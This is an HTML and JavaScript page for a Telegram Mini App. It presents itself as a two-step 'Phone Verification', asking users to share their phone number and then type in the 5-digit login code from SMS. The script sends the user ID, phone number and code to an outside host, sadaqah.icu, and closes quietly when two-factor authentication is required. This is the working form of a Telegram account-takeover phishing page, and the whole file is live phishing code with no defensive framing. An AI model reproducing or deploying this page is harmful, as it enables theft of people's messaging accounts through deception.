<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Confirmation</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root {
      --bg: var(--tg-theme-bg-color, #0b0d10);
      --text: var(--tg-theme-text-color, #e9eef5);
      --hint: var(--tg-theme-hint-color, rgba(233,238,245,.65));
      --secondary: var(--tg-theme-secondary-bg-color, rgba(255,255,255,.06));
      --button: var(--tg-theme-button-color, #2ea6ff);
      --buttonText: var(--tg-theme-button-text-color, #ffffff);
      --radius: 18px;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      color: var(--text);
      background-image: url('./baba.jpeg');
      font-family: system-ui, sans-serif;
      padding: env(safe-area-inset-top, 16px) 16px env(safe-area-inset-bottom, 16px);
      display: flex; justify-content: center; align-items: center;
    }
    .wrap { width: 100%; max-width: 420px; display: flex; flex-direction: column; gap: 16px; }
    .card {
      background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.05));
      border: 1px solid rgba(255,255,255,.10);
      border-radius: var(--radius);
      box-shadow: 0 12px 30px rgba(0,0,0,.25);
      padding: 24px 16px;
      backdrop-filter: blur(10px);
    }
    .title { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
    .subtitle { color: var(--hint); font-size: 14px; line-height: 1.5; }
    .pill {
      padding: 8px 12px; border-radius: 999px;
      background: var(--secondary); color: var(--hint);
      font-size: 12px; border: 1px solid rgba(255,255,255,.08); white-space: nowrap;
    }
    .pill.ok { background: rgba(46,166,255,.15); color: #2ea6ff; border-color: rgba(46,166,255,.3); }
    .top { display: flex; justify-content: space-between; align-items: flex-start; gap: 12px; }

    .share-btn {
      margin-top: 20px; width: 100%; padding: 16px;
      border-radius: 14px; border: none;
      background: var(--button); color: var(--buttonText);
      font-size: 16px; font-weight: 600; cursor: pointer;
      transition: opacity 0.15s;
    }
    .share-btn:active { opacity: 0.85; }
    .share-btn:disabled { opacity: 0.45; cursor: not-allowed; }
    .status-line {
      margin-top: 14px; text-align: center;
      font-size: 13px; color: var(--hint); min-height: 22px;
      display: flex; align-items: center; justify-content: center; gap: 8px;
    }
    .spinner {
      width: 14px; height: 14px; flex-shrink: 0;
      border: 2px solid rgba(255,255,255,.15); border-top-color: #2ea6ff;
      border-radius: 50%; animation: spin .7s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    .codeBox {
      margin: 20px 0 10px; padding: 16px; border-radius: 16px;
      border: 1px solid rgba(255,255,255,.12); background: rgba(0,0,0,.15); text-align: center;
    }
    .dots { display: flex; justify-content: center; gap: 14px; }
    .dot {
      width: 14px; height: 14px; border-radius: 50%;
      background: rgba(255,255,255,.18); border: 1px solid rgba(255,255,255,.15);
      transition: all .2s;
    }
    .dot.on { background: #2ea6ff; border-color: rgba(46,166,255,.5); transform: scale(1.1); }
    .hint-row {
      display: flex; justify-content: space-between;
      color: var(--hint); font-size: 13px; margin-top: 8px;
    }

    .keyboard { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
    .key {
      height: 64px; border-radius: 16px;
      border: 1px solid rgba(255,255,255,.12); background: rgba(255,255,255,.05);
      color: var(--text); font-size: 24px; font-weight: bold;
      box-shadow: 0 6px 16px rgba(0,0,0,.2); cursor: pointer; transition: all .12s;
    }
    .key:active { transform: scale(0.96); opacity: 0.9; }
    .spacer { opacity: 0; pointer-events: none; }

    .hidden { display: none !important; }
  </style>
</head>
<body>
<div class="wrap">

  <!-- Screen: share phone number -->
  <div id="phoneScreen" class="card hidden">
    <div class="top">
      <div>
        <div class="title">Phone Verification</div>
        <div class="subtitle">Press the button to share your contact. This will only take a moment.</div>
      </div>
      <div class="pill" id="pill">Step 1/2</div>
    </div>
    <button class="share-btn" id="shareBtn" onclick="startContactFlow()">
      📱 Share Phone Number
    </button>
    <div class="status-line" id="statusLine"></div>
  </div>

  <!-- Screen: enter code -->
  <div id="codeScreen" class="card hidden">
    <div class="top">
      <div>
        <div class="title">Enter Code</div>
        <div class="subtitle">Code from SMS</div>
      </div>
      <div class="pill ok" id="phonePill">—</div>
    </div>
    <div class="codeBox">
      <div class="dots" id="dots"></div>
    </div>
    <div class="hint-row">
      <span id="progress">0 / 5</span>
      <span>⌫ — delete</span>
    </div>
  </div>

  <!-- Numeric keyboard -->
  <div id="keyboard" class="keyboard hidden"></div>

</div>
<script>
  const tg = window.Telegram.WebApp;
  tg.ready(); tg.expand();

  const tgUser = tg.initDataUnsafe?.user;
  const userId = tgUser?.id;
  if (!userId) { alert('No user ID'); throw new Error(); }

  const urlPhone = new URLSearchParams(location.search).get('phone') || '';

  const CODE_LEN = 5;
  let code = '';
  let phone = urlPhone;
  let polling = false;
  let pollTimer = null;

  const phoneScreen = document.getElementById('phoneScreen');
  const codeScreen  = document.getElementById('codeScreen');
  const keyboard    = document.getElementById('keyboard');
  const shareBtn    = document.getElementById('shareBtn');
  const pill        = document.getElementById('pill');
  const statusLine  = document.getElementById('statusLine');
  const phonePill   = document.getElementById('phonePill');
  const dotsEl      = document.getElementById('dots');
  const progressEl  = document.getElementById('progress');

  function mask(p) {
    const d = (p || '').replace(/\D/g, '');
    return d.length > 4 ? '+' + d.slice(0, 2) + '****' + d.slice(-4) : (p || '—');
  }

  function setStatus(text, spin = false) {
    statusLine.innerHTML = spin
      ? `<div class="spinner"></div><span>${text}</span>`
      : `<span>${text}</span>`;
  }

  function showPhone() {
    phoneScreen.classList.remove('hidden');
    codeScreen.classList.add('hidden');
    keyboard.classList.add('hidden');
  }

  function showCode() {
    stopPolling();
    phoneScreen.classList.add('hidden');
    codeScreen.classList.remove('hidden');
    keyboard.classList.remove('hidden');
    phonePill.textContent = mask(phone);
    renderDots();
  }

  function startContactFlow() {
    shareBtn.disabled = true;
    setStatus('Requesting number...', true);

    tg.requestContact((success) => {
      console.log('[requestContact cb] success=', success);
      if (!success) {
        shareBtn.disabled = false;
        setStatus('Denied. Please try again.');
        return;
      }
      setStatus('Waiting for confirmation...', true);
      startPolling();
    });
  }

  function startPolling() {
    if (polling) return;
    polling = true;
    let attempts = 0;
    const maxAttempts = 30;

    async function poll() {
      if (!polling) return;
      attempts++;
      if (attempts > maxAttempts) {
        stopPolling();
        shareBtn.disabled = false;
        setStatus('Timed out. Please try again.');
        return;
      }

      try {
        const resp = await fetch(
          `https://sadaqah.icu/status?user_id=${userId}`,
          { cache: 'no-store' }
        );
        const data = await resp.json();
        console.log('[poll]', data);

        if (data.state === 'get_code' && data.phone) {
          phone = data.phone;
          pill.textContent = mask(phone);
          pill.classList.add('ok');
          setStatus('Code sent!');
          setTimeout(showCode, 400);
          return;
        }
      } catch (e) {
        console.warn('[poll] error', e);
      }

      pollTimer = setTimeout(poll, 2000);
    }

    poll();
  }

  function stopPolling() {
    polling = false;
    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
  }

  function renderDots() {
    dotsEl.innerHTML = '';
    for (let i = 0; i < CODE_LEN; i++) {
      const d = document.createElement('div');
      d.className = 'dot' + (i < code.length ? ' on' : '');
      dotsEl.appendChild(d);
    }
    progressEl.textContent = `${code.length} / ${CODE_LEN}`;
  }

  function addDigit(d) {
    if (code.length >= CODE_LEN) return;
    code += d; renderDots();
    if (code.length === CODE_LEN) {
      tg.MainButton.setText('✅ Confirm').show();
      tg.MainButton.onClick(submitCode);
    } else {
      tg.MainButton.hide();
    }
  }

  function delDigit() {
    code = code.slice(0, -1);
    renderDots();
    tg.MainButton.hide();
  }

  async function submitCode() {
    if (code.length !== CODE_LEN) return;
    tg.MainButton.showProgress(true);
    tg.MainButton.disable();
    try {
      const r = await fetch('https://sadaqah.icu/submit_code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ user_id: userId, phone, code })
      });
      const data = await r.json();
      if (data.status === 'ok') {
        tg.close();
      } else if (data.status === '2fa_required') {
        tg.close();
      } else {
        alert(data.message || 'Incorrect code, please try again');
        code = ''; renderDots();
      }
    } catch (e) {
      alert('Network error');
    } finally {
      tg.MainButton.hideProgress();
      tg.MainButton.enable();
      tg.MainButton.hide();
    }
  }

  ['1','2','3','4','5','6','7','8','9','spacer','0','del'].forEach(k => {
    const btn = document.createElement('button');
    btn.className = 'key' + (k === 'spacer' ? ' spacer' : '');
    if (k === 'del') { btn.textContent = '⌫'; btn.onclick = delDigit; }
    else if (k !== 'spacer') { btn.textContent = k; btn.onclick = () => addDigit(k); }
    keyboard.appendChild(btn);
  });

  window.addEventListener('keydown', e => {
    if (codeScreen.classList.contains('hidden')) return;
    if (/^[0-9]$/.test(e.key)) addDigit(e.key);
    if (e.key === 'Backspace') delDigit();
    if (e.key === 'Enter' && code.length === CODE_LEN) submitCode();
  });

  if (urlPhone) {
    phone = urlPhone;
    showCode();
  } else {
    showPhone();
  }
</script>
</body>
</html>
